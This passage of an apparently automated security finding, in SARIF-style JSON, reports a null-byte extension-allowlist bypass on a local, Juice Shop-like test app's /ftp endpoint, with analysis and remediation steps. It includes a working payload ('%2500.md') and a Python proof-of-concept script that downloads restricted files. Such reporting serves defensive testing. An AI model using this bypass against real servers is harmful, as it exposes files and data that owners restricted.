                  }
                }
              },
              "message": {
                "text": "Extension allowlist check that is bypassed because it runs on unsanitized input"
              }
            }
          ],
          "properties": {
            "security-severity": "7.5",
            "strix": {
              "id": "vuln-0012",
              "severity": "high",
              "cvss": 7.5,
              "timestamp": "2026-05-09 11:00:53 UTC",
              "target": "http://host.docker.internal:3002",
              "endpoint": "/ftp/:file",
              "method": "GET",
              "cwe": "CWE-158",
              "impact": "An unauthenticated attacker can download any file stored in the /ftp directory regardless of its extension, including:\n\n- package.json.bak — Application backup containing dependency information and internal metadata\n- coupons_2013.md.bak — Historical coupon codes that may still be valid\n- suspicious_errors.yml — Error logs potentially containing stack traces and internal paths\n- eastere.gg — Hidden application content\n- encrypt.pyc — Compiled Python bytecode potentially containing encryption logic\n\nExposure of backup files and configuration artifacts can reveal internal application structure, dependency versions (enabling targeted CVE exploitation), and business-sensitive data such as coupon codes or encryption routines.",
              "technical_analysis": "The vulnerability exists in routes/fileServer.ts in the `servePublicFiles` function. The processing flow is:\n\n1. The filename parameter from the URL path is passed to the `verify()` function (line 19).\n2. `endsWithAllowlistedFileType()` (line 52-53) checks if the parameter ends with `.md` or `.pdf`. A request for `package.json.bak%2500.md` passes this check because the raw string ends with `.md`.\n3. After the allowlist check passes, `security.cutOffPoisonNullByte()` (line 28) strips the `%00` sequence and everything after it, reducing the filename to `package.json.bak`.\n4. The stripped filename is then passed to `res.sendFile()` (line 33), which serves the restricted file.\n\nThe critical flaw is the ordering: the allowlist check occurs on the unprocessed input, while the file resolution uses the sanitized (truncated) input. This creates a classic check-vs-use inconsistency (TOCTOU pattern) that enables the bypass.\n\nIn lib/insecurity.ts (lines 46-51), `cutOffPoisonNullByte` searches for the literal string `%00` and returns only the portion before it. The double-encoding `%2500` is URL-decoded by Express into `%00` before reaching the handler, which then matches the null byte pattern.",
              "remediation_steps": "1. Reverse the order of operations: sanitize the filename (strip null bytes and normalize encoding) before performing the allowlist check:\n   - Call `cutOffPoisonNullByte()` first, then check the sanitized result against the extension allowlist\n   - This ensures the allowlist is evaluated against the actual filename that will be served\n\n2. Apply strict input validation on the filename parameter:\n   - Reject filenames containing percent-encoded sequences that decode to control characters\n   - Use a positive character allowlist (alphanumeric, hyphen, underscore, single dot for extension)\n\n3. Validate the final resolved file path against an explicit allowlist of permitted files rather than relying solely on extension checks.\n\n4. Remove sensitive files from the /ftp directory that should not be publicly accessible under any circumstances.",
              "poc": {
                "description": "To reproduce:\n\n1. Attempt to download a restricted file directly to confirm it is blocked:\n   GET /ftp/package.json.bak — returns HTTP 403 \"Only .md and .pdf files are allowed!\"\n\n2. Append an encoded null byte followed by a permitted extension:\n   GET /ftp/package.json.bak%2500.md — returns HTTP 200 with the file content\n\n3. Verify the response body contains the actual backup file content rather than an error page.\n\n4. Repeat with other restricted files to confirm consistent bypass.",
                "script": "import requests\n\nBASE = \"http://host.docker.internal:3002\"\n\n# Demonstrate the null byte bypass on multiple restricted files\nrestricted_files = [\n    \"package.json.bak\",\n    \"eastere.gg\",\n    \"coupons_2013.md.bak\",\n    \"suspicious_errors.yml\",\n]\n\nfor filename in restricted_files:\n    # Step 1: Confirm the file is blocked without bypass\n    blocked_resp = requests.get(f\"{BASE}/ftp/{filename}\")\n    print(f\"GET /ftp/{filename}: {blocked_resp.status_code} (blocked)\")\n\n    # Step 2: Use null byte injection to bypass\n    bypass_url = f\"{BASE}/ftp/{filename}%2500.md\"\n    bypass_resp = requests.get(bypass_url)\n    print(f\"GET /ftp/{filename}%2500.md: {bypass_resp.status_code} (bypassed)\")\n    print(f\"Content preview: {bypass_resp.text[:100]}\")\n    print(\"---\")\n\n# Detailed demonstration with package.json.bak\nprint(\"\\n=== Full package.json.bak content (first 500 chars) ===\")\nresp = requests.get(f\"{BASE}/ftp/package.json.bak%2500.md\")\nprint(resp.text[:500])"
              }
            }
          }
